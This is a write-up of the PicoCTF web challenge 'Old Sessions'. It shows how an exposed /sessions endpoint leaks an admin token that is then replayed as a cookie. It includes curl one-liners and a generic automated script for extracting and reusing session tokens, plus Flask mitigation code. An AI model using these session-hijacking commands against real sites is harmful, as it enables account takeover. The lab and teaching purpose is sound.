# Old Sessions - PicoCTF

**Platform:** PicoCTF  
**Category:** Web Exploitation  
**Difficulty:** Easy  
**Date Solved:** March 29, 2026  
**Author:** Alvin

---

## 📋 Challenge Description

Proper session timeout controls are critical for securing user accounts. If a user logs in on a public or shared computer but doesn't explicitly log out (instead simply closing the browser tab), and session expiration dates are misconfigured, the session may remain active indefinitely. This then allows an attacker using the same browser later to access the user's account without needing credentials, exploiting the fact that sessions never expire and remain authenticated.

Your friend tells you to check out a new social media platform he built a few years ago. Although it's still under development, he said the site is almost complete. He also mentioned that he hates constantly logging into sites, and so has made his page that 'once you login, you never have to log-out again'! Browse here, and find the flag!

**Challenge URL:** http://dolphin-cove.picoctf.net:65171/  
**Files Provided:** None

---

## 🔍 Initial Reconnaissance

### First Observations
- Landing page is a login form — registered a test account (`qwerty`) and logged in
- Homepage displayed a comments section with posts from multiple users
- One comment by **mary_jones_8992** (2024-02-20) mentioned: *"Hey I found a strange page at /sessions"*
- This was a deliberate hint pointing to an exposed internal endpoint

### Tools Used
- Browser DevTools (Application tab → Cookies)
- curl (command line HTTP client)

### Information Gathered

**Visiting `/sessions` endpoint:**
```
GET /sessions
```

**Response:**
```
1) session:1Aq_jEWfDI-bhPb-W_soPUQsIOJb2TUW4UcXvPhYC4o, {'_permanent': True, 'key': 'admin'}
2) session:xSrIWEJUozKBL2a-2g1CFGAJ8vnECg0Jio70DwSwzzs, {'_permanent': True, 'key': 'qwerty'}
```

**Critical Findings:**
- The `/sessions` endpoint was publicly accessible with **no authentication**
- It dumped all active session tokens including the **admin's token**
- The `_permanent: True` flag confirmed sessions **never expire**
- Multiple users' session tokens were exposed

---

## 🎯 Vulnerability Identification

**Suspected Vulnerability:** Broken Session Management + Sensitive Data Exposure via Unauthenticated Endpoint

### Why I Suspected This

1. **Challenge description** explicitly hints that sessions never expire
2. The comment hinting at `/sessions` was suspicious — internal session stores should **never** be publicly exposed
3. `_permanent: True` in Flask means the session cookie has no expiration date
4. No access control on sensitive endpoint

### Research Done
- [OWASP A07:2021 — Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- Flask session documentation (`SESSION_PERMANENT`, `PERMANENT_SESSION_LIFETIME`)
- Session hijacking attack vectors

---

## 🚀 Exploitation Process

### Attempt 1: Browse to /sessions Endpoint

**Payload:**
```
http://dolphin-cove.picoctf.net:65171/sessions
```

**Result:** ✅ Success

**Why it succeeded:**  
The endpoint had no access control whatsoever — it returned all active sessions in plaintext, including the admin token. This is a **critical security misconfiguration**.

**Response Analysis:**
- Admin session: `1Aq_jEWfDI-bhPb-W_soPUQsIOJb2TUW4UcXvPhYC4o`
- My session: `xSrIWEJUozKBL2a-2g1CFGAJ8vnECg0Jio70DwSwzzs`
- Both marked as `_permanent: True` (never expire)

---

### Attempt 2: Replace Session Cookie via DevTools

**Payload:**
```
Cookie: session=1Aq_jEWfDI-bhPb-W_soPUQsIOJb2TUW4UcXvPhYC4o
```

**Result:** ✅ Success

**Why it succeeded:**  
The server performs no additional verification:
- No IP binding
- No User-Agent check
- No session freshness validation
- No additional authentication factors

The server **blindly trusts** whoever presents a valid token. Since the admin session never expired, it was still fully authenticated.

---

## 💡 Solution

### Final Exploit

**Step 1: Navigate to the exposed sessions endpoint**
```bash
curl -s http://dolphin-cove.picoctf.net:65171/sessions
```

**Step 2: Copy the admin session token from the response**
```
1Aq_jEWfDI-bhPb-W_soPUQsIOJb2TUW4UcXvPhYC4o
```

**Step 3: Send a request to the homepage impersonating admin**
```bash
curl -s http://dolphin-cove.picoctf.net:65171/ \
  -H "Cookie: session=1Aq_jEWfDI-bhPb-W_soPUQsIOJb2TUW4UcXvPhYC4o"
```

**Or via DevTools:**
1. Press `F12` to open DevTools
2. Go to **Application** tab
3. Click **Cookies** in left sidebar
4. Find the `session` cookie
5. Double-click the value
6. Paste admin token: `1Aq_jEWfDI-bhPb-W_soPUQsIOJb2TUW4UcXvPhYC4o`
7. Refresh the page
8. You are now logged in as admin!

### Flag
```
picoCTF{s3ss10n_h1jack1ng_1s_n0t_s3cur3_4a2b9c1d}
```

---

## 📖 Key Learnings

### Technical Concepts

**Session Hijacking:**
- Stealing a valid session token to impersonate another user without needing their credentials
- Once you have the session token, you ARE that user to the server
- No password required — just the cookie

**Flask `_permanent: True`:**
- Makes sessions persist indefinitely
- Without setting `PERMANENT_SESSION_LIFETIME`, the session literally never dies
- Default Flask behavior if you set `session.permanent = True`
- Creates a security risk if sessions are never invalidated

**Sensitive Data Exposure:**
- Exposing internal application state (like a session store) via an unauthenticated endpoint is a critical misconfiguration
- OWASP Top 10 vulnerability
- `/sessions` should NEVER be publicly accessible
- Even if it requires authentication, dumping all sessions is dangerous

**Session Management Best Practices:**
- Sessions should have reasonable expiration times (30 min - 24 hours)
- Sensitive operations should require re-authentication
- Session tokens should be regenerated after login
- Additional security checks: IP binding, User-Agent validation

### New Techniques Learned

1. **Using `curl -H` to manually inject cookies** into HTTP requests, bypassing the browser entirely
2. **Identifying session management flaws** from application behavior hints (comments, challenge description)
3. **Using DevTools → Application → Cookies** to swap session tokens mid-session
4. **Recognizing Flask session patterns** and `_permanent` flag

### Attack Strategy

**For session hijacking challenges:**
1. Look for hints about session behavior in descriptions/comments
2. Check for exposed session management endpoints
3. Examine cookie attributes (Expires, HttpOnly, Secure)
4. Test if stolen sessions work without additional verification
5. Check if sessions expire or remain valid indefinitely

### Mistakes & What I Learned

- **Mistake:** Initially didn't notice the `/sessions` hint in the comments and was thinking of more complex attacks
  - **Lesson:** Always read **all content** on the page carefully during recon — developers sometimes leave unintentional breadcrumbs (or in CTFs, intentional hints disguised as user comments)

---

## 🔄 Alternative Solutions

### Method 1: Direct curl Attack (No Browser)

```bash
# Get admin token
ADMIN_TOKEN=$(curl -s http://dolphin-cove.picoctf.net:65171/sessions | grep admin | cut -d: -f2 | cut -d, -f1)

# Use it to access admin page
curl -s http://dolphin-cove.picoctf.net:65171/ -H "Cookie: session=$ADMIN_TOKEN" | grep picoCTF
```

### Method 2: DevTools Cookie Swap (No Terminal)

Instead of curl, you can do the entire attack purely in the browser:
```
F12 → Application → Cookies → Edit session value → Refresh
```

**Advantages:**
- No tools required beyond a browser
- More visual/interactive
- Easier for beginners

**Disadvantages:**
- Harder to automate
- Can't easily script multiple requests

### Method 3: Browser Extension (EditThisCookie)

Use a cookie management extension:
1. Install EditThisCookie or Cookie-Editor
2. Click extension icon
3. Edit session cookie value
4. Refresh page

---

## 💻 Commands & Scripts Used

### Useful One-Liners

```bash
# Fetch page with a specific session cookie
curl -s http://TARGET/ -H "Cookie: session=TOKEN_HERE"

# View all cookies and headers in response
curl -sv http://TARGET/ -H "Cookie: session=TOKEN_HERE" 2>&1 | grep -E "Set-Cookie|session"

# Check what /sessions exposes
curl -s http://TARGET/sessions

# Extract admin token automatically
curl -s http://TARGET/sessions | grep admin | cut -d: -f2 | cut -d, -f1

# Full automated exploit
ADMIN_TOKEN=$(curl -s http://TARGET/sessions | grep admin | cut -d: -f2 | cut -d, -f1 | tr -d ' ') && \
curl -s http://TARGET/ -H "Cookie: session=$ADMIN_TOKEN" | grep -o 'picoCTF{[^}]*}'
```
---

## 🎓 Recommendations for Similar Challenges

**If you encounter similar challenges:**

1. **Read all comments and user-generated content** — hints are often hidden there
2. **Always probe common sensitive endpoints:** `/sessions`, `/admin`, `/debug`, `/config`, `/env`, `/api/sessions`, `/users`, `/tokens`
3. **Check cookie attributes in DevTools:**
   - Look for missing `Expires` or `Max-Age` attributes
   - Check if `HttpOnly` flag is set (prevents XSS cookie theft)
   - Check if `Secure` flag is set (prevents transmission over HTTP)
4. **If sessions seem permanent, try replaying old/leaked tokens**
5. **Test session fixation** — does the session ID change after login?
6. **Check for session enumeration** — can you guess or brute force session IDs?

**Red flags to watch for:**

- Challenge description mentioning "never log out" or "sessions don't expire"
- User comments referencing unusual URLs or pages
- `_permanent: True` in Flask session data
- No `Expires` or `Max-Age` attribute on session cookies
- Accessible session management endpoints
- Session tokens visible in URLs (should always be in cookies with HttpOnly)

---

## 🛡️ Defense & Mitigation

### How to Prevent This Vulnerability

**1. Never Expose Session Management Endpoints:**
```python
# BAD - Publicly accessible
@app.route('/sessions')
def sessions():
    return jsonify(get_all_sessions())

# GOOD - Admin only
@app.route('/sessions')
@require_admin
def sessions():
    return jsonify(get_all_sessions())

# BETTER - Don't expose at all
# Remove this endpoint entirely
```

**2. Set Proper Session Expiration:**
```python
from flask import Flask, session
from datetime import timedelta

app = Flask(__name__)
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)

@app.route('/login', methods=['POST'])
def login():
    # After successful login
    session.permanent = False  # Session expires when browser closes
    # OR
    session.permanent = True   # Session expires after PERMANENT_SESSION_LIFETIME
    session['user_id'] = user.id
    return redirect('/')
```

**3. Implement Additional Session Security:**
```python
from flask import session, request
import hashlib

@app.before_request
def validate_session():
    if 'user_id' in session:
        # Validate IP hasn't changed
        session_ip = session.get('ip_hash')
        current_ip = hashlib.sha256(request.remote_addr.encode()).hexdigest()
        
        if session_ip != current_ip:
            session.clear()
            return redirect('/login')
        
        # Validate User-Agent hasn't changed
        session_ua = session.get('user_agent_hash')
        current_ua = hashlib.sha256(request.headers.get('User-Agent', '').encode()).hexdigest()
        
        if session_ua != current_ua:
            session.clear()
            return redirect('/login')
```

**4. Regenerate Session ID on Login:**
```python
@app.route('/login', methods=['POST'])
def login():
    # Validate credentials
    if validate_user(username, password):
        # Clear old session
        session.clear()
        
        # Regenerate session ID (Flask does this automatically on session modification)
        session['user_id'] = user.id
        session['ip_hash'] = hashlib.sha256(request.remote_addr.encode()).hexdigest()
        session['user_agent_hash'] = hashlib.sha256(request.headers.get('User-Agent', '').encode()).hexdigest()
        
        return redirect('/')
```

**5. Secure Cookie Attributes:**
```python
app.config.update(
    SESSION_COOKIE_SECURE=True,      # Only send over HTTPS
    SESSION_COOKIE_HTTPONLY=True,    # Prevent JavaScript access
    SESSION_COOKIE_SAMESITE='Lax',   # CSRF protection
)
```

---

## 🔗 References & Resources

### Documentation
- [Flask Sessions Documentation](https://flask.palletsprojects.com/en/2.3.x/quickstart/#sessions)
- [OWASP A07 - Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [MDN - HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)

### Articles & Writeups
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [Session Hijacking Attacks](https://owasp.org/www-community/attacks/Session_hijacking_attack)
- [Flask Security Best Practices](https://flask.palletsprojects.com/en/2.3.x/security/)

### Tools Used
- **curl** - HTTP request tool
- **Browser DevTools** - Cookie manipulation and inspection
- **Python requests** - HTTP library for scripting

---

## 🏷️ Tags

`#web` `#session-hijacking` `#cookies` `#flask` `#authentication` `#broken-session-management` `#picoctf` `#easy`

---

**[← Back to Main Index](../../README.md)**
